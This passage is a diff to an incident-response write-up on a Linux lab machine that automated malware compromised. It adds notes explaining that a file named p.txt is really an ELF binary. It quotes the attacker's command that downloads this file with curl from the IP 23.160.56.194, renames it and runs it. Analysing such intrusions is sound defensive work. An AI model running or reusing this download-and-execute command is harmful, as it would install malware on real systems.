@@ -400,3 +400,47 @@ This confirms the activity represents a **real-world malware compromise**.
 This incident represents a **complete Linux system compromise** performed by automated malware exploiting weak authentication during a student lab exercise. While the insecure configuration was intentional for instructional purposes, it created conditions identical to real-world attack surfaces.
 
 Microsoft Defender for Endpoint successfully detected the malicious activity, enabling investigation and confirmation of compromise. This case highlights how quickly exposed Linux systems can be compromised and reinforces the importance of monitoring persistence mechanisms, binary integrity, and log tampering — even in educational or non-production environments.
+
+
+## Misc
+
+p.txt
+
+<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />
+
+<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" />
+
+<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />
+
+
+
+Keep the same URL so all infected machines keep pulling the “latest version”
+
+FileType: ElfExecutable
+Even though it's named .txt.
+
+That means:
+
+It’s not actually a text file. It’s a compiled Linux binary.
+
+Classic attacker trick:
+
+Name file .txt to avoid suspicion
+
+Download it
+
+Rename it
+
+Execute it
+
+You saw exactly that behavior earlier with:
+
+curl http://23.160.56.194/p.txt -o ygljglkjgfg0
+./ygljglkjgfg0
+So:
+
+p.txt = malicious ELF binary
+ygljglkjgfg0 = renamed executable copy
+
+23.160.56.194
+<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />
